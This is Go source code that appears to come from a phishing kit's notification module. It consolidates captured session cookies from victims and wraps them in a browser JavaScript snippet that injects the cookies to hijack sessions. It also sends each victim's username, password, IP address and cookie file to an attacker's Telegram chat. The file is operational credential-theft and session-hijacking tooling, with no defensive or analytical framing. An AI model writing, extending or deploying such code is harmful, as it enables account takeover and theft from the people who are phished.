package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type Token struct {
	Name             string      `json:"name"`
	Value            string      `json:"value"`
	Domain           string      `json:"domain"`
	HostOnly         bool        `json:"hostOnly"`
	Path             string      `json:"path"`
	Secure           bool        `json:"secure"`
	HttpOnly         bool        `json:"httpOnly"`
	SameSite         string      `json:"sameSite"`
	Session          bool        `json:"session"`
	FirstPartyDomain string      `json:"firstPartyDomain"`
	PartitionKey     interface{} `json:"partitionKey"`
	ExpirationDate   *int64      `json:"expirationDate,omitempty"`
	StoreID          interface{} `json:"storeId"`
}

// extractTokens pulls each token from the given nested map and maps it to a Token struct.
func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
	var tokens []Token

	for domain, tokenGroup := range input {
		for _, tokenData := range tokenGroup {
			var t Token

			if name, ok := tokenData["Name"].(string); ok {
				t.Name = name
			}
			if val, ok := tokenData["Value"].(string); ok {
				t.Value = val
			}
			// Remove leading dot from domain
			if len(domain) > 0 && domain[0] == '.' {
				domain = domain[1:]
			}
			t.Domain = domain

			if hostOnly, ok := tokenData["HostOnly"].(bool); ok {
				t.HostOnly = hostOnly
			}
			if path, ok := tokenData["Path"].(string); ok {
				t.Path = path
			}
			if secure, ok := tokenData["Secure"].(bool); ok {
				t.Secure = secure
			}
			if httpOnly, ok := tokenData["HttpOnly"].(bool); ok {
				t.HttpOnly = httpOnly
			}
			if sameSite, ok := tokenData["SameSite"].(string); ok {
				t.SameSite = sameSite
			}
			if session, ok := tokenData["Session"].(bool); ok {
				t.Session = session
			}
			if fpd, ok := tokenData["FirstPartyDomain"].(string); ok {
				t.FirstPartyDomain = fpd
			}
			if pk, ok := tokenData["PartitionKey"]; ok {
				t.PartitionKey = pk
			}
			if storeID, ok := tokenData["storeId"]; ok {
				t.StoreID = storeID
			} else if storeID, ok := tokenData["StoreID"]; ok {
				t.StoreID = storeID
			}

			// Remove expirationDate field
			t.ExpirationDate = nil

			tokens = append(tokens, t)
		}
	}
	return tokens
}

// processAllTokens takes multiple JSON strings of cookies, unmarshals them, and consolidates them.
func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
	var consolidatedTokens []Token

	// Parse and extract tokens for each category
	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens, customTokens} {
		if tokenJSON == "" {
			continue
		}

		var rawTokens map[string]map[string]map[string]interface{}
		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
			return nil, fmt.Errorf("error parsing token JSON: %v", err)
		}

		tokens := extractTokens(rawTokens)

		// Remove expirationDate from each token before saving
		for i := range tokens {
			tokens[i].ExpirationDate = nil
		}

		consolidatedTokens = append(consolidatedTokens, tokens...)
	}

	return consolidatedTokens, nil
}

// Global concurrency controls
var (
	processedSessions = make(map[string]bool)
	sessionMessageMap = make(map[string]int)
	mu                sync.Mutex
)

// generateRandomString returns a 10-char random alphanumeric string.
func generateRandomString() string {
	rand.Seed(time.Now().UnixNano())
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	length := 10
	randomStr := make([]byte, length)
	for i := range randomStr {
		randomStr[i] = charset[rand.Intn(len(charset))]
	}
	return string(randomStr)
}

// createTxtFile generates a .txt file with combined cookies in a JS snippet.
func createTxtFile(session Session) (string, error) {
	// Create a text file name based on the email and timestamp
	safeEmail := strings.ReplaceAll(session.Username, "@", "_")
	safeEmail = strings.ReplaceAll(safeEmail, ".", "_")
	timestamp := time.Now().Format("20060102_150405") // YYYYMMDD_HHMMSS
	txtFileName := fmt.Sprintf("%s_%s.txt", safeEmail, timestamp)
	txtFilePath := filepath.Join(os.TempDir(), txtFileName)

	// Create a new text file
	txtFile, err := os.Create(txtFilePath)
	if err != nil {
		return "", fmt.Errorf("failed to create text file: %v", err)
	}
	defer txtFile.Close()

	// Marshal the session maps into JSON byte slices
	tokensJSON, err := json.MarshalIndent(session.Tokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Tokens: %v", err)
	}
	httpTokensJSON, err := json.MarshalIndent(session.HTTPTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal HTTPTokens: %v", err)
	}
	bodyTokensJSON, err := json.MarshalIndent(session.BodyTokens, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal BodyTokens: %v", err)
	}
	customJSON, err := json.MarshalIndent(session.Custom, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to marshal Custom: %v", err)
	}

	// Combine all token groups into a single slice
	allTokens, err := processAllTokens(
		string(tokensJSON),
		string(httpTokensJSON),
		string(bodyTokensJSON),
		string(customJSON),
	)
	if err != nil {
		return "", fmt.Errorf("error processing tokens: %v", err)
	}

	result, err := json.MarshalIndent(allTokens, "", "  ")
	if err != nil {
		fmt.Println("Error marshalling final tokens:", err)
	}

	fmt.Println("Combined Tokens: ", string(result))

	// Build the JavaScript snippet without using backtick-quoted strings in Go:
	jsWrapper := "(function(){\n" +
		"let cookies = JSON.parse(`" + string(result) + "`);\n" +
		"function putCookie(key, value, domain, path, isSecure) {\n" +
		"    const cookieMaxAge = 'Max-Age=31536000';\n" +
		"    if (isSecure) {\n" +
		"        console.log('Setting Cookie', key, value);\n" +
		"        if (window.location.hostname == domain) {\n" +
		"            document.cookie = `" + "${key}=${value};${cookieMaxAge}; path=${path}; Secure; SameSite=None" + "`;\n" +
		"        } else {\n" +
		"            document.cookie = `" + "${key}=${value};${cookieMaxAge};domain=${domain};path=${path};Secure;SameSite=None" + "`;\n" +
		"        }\n" +
		"    } else {\n" +
		"        console.log('Setting Cookie', key, value);\n" +
		"        if (window.location.hostname == domain) {\n" +
		"            document.cookie = `" + "${key}=${value};${cookieMaxAge};path=${path};" + "`;\n" +
		"        } else {\n" +
		"            document.cookie = `" + "${key}=${value};${cookieMaxAge};domain=${domain};path=${path};" + "`;\n" +
		"        }\n" +
		"    }\n" +
		"}\n" +
		"for (let cookie of cookies) {\n" +
		"    putCookie(cookie.name, cookie.value, cookie.domain, cookie.path, cookie.secure);\n" +
		"}\n" +
		"}());"

	// Write the wrapped JavaScript content into the text file
	_, err = txtFile.WriteString(jsWrapper)
	if err != nil {
		return "", fmt.Errorf("failed to write data to text file: %v", err)
	}

	return txtFilePath, nil
}

// formatSessionMessage creates the text snippet for Telegram (excluding token data).
func formatSessionMessage(session Session) string {
	// Check if the session is complete
	sessionComplete := session.Username != "" && session.Password != "" && len(session.Tokens) > 0

	// Set the correct symbols
	statusSymbol := "✅"
	if !sessionComplete {
		statusSymbol = "🚫"
	}

	return fmt.Sprintf("%s🔐 ====== Evolcorp MDR ====== 🔐%s\n\n"+
		"👤 Username: 🪤 %s\n"+
		"🔑 Password: 🪤 %s\n"+
		"🌐 Landing URL: 🔗 %s\n\n"+
		"🖥️ User-Agent: %s\n"+
		"🌍 IP Address: %s\n"+
		"🕒 Timestamp: %d\n\n"+
		"📦 Token Delivery. 🍪 incoming.\n",
		statusSymbol, statusSymbol,
		session.Username,
		session.Password,
		session.LandingURL,
		session.UserAgent,
		session.RemoteAddr,
		session.CreateTime,
	)
}


// Notify orchestrates creation of a text file, then sends (or edits) a Telegram notification.
func Notify(session Session) {
	config, err := loadConfig()
	if err != nil {
		fmt.Println(err)
		return
	}

	mu.Lock()
	if processedSessions[string(session.ID)] {
		mu.Unlock()
		messageID, exists := sessionMessageMap[string(session.ID)]
		if exists {
			txtFilePath, errCreate := createTxtFile(session)
			if errCreate != nil {
				fmt.Println("Error creating TXT file for update:", errCreate)
				return
			}
			msgBody := formatSessionMessage(session)
			errEdit := editMessageFile(config.TelegramChatID, config.TelegramToken, messageID, txtFilePath, msgBody)
			if errEdit != nil {
				fmt.Printf("Error editing message: %v\n", errEdit)
			}
			os.Remove(txtFilePath)
		}
		return
	}

	processedSessions[string(session.ID)] = true
	mu.Unlock()

	txtFilePath, err := createTxtFile(session)
	if err != nil {
		fmt.Println("Error creating TXT file:", err)
		return
	}

	message := formatSessionMessage(session)
	messageID, err := sendTelegramNotification(config.TelegramChatID, config.TelegramToken, message, txtFilePath)
	if err != nil {
		fmt.Printf("Error sending Telegram notification: %v\n", err)
		os.Remove(txtFilePath)
		return
	}

	mu.Lock()
	sessionMessageMap[string(session.ID)] = messageID
	mu.Unlock()

	os.Remove(txtFilePath)
}
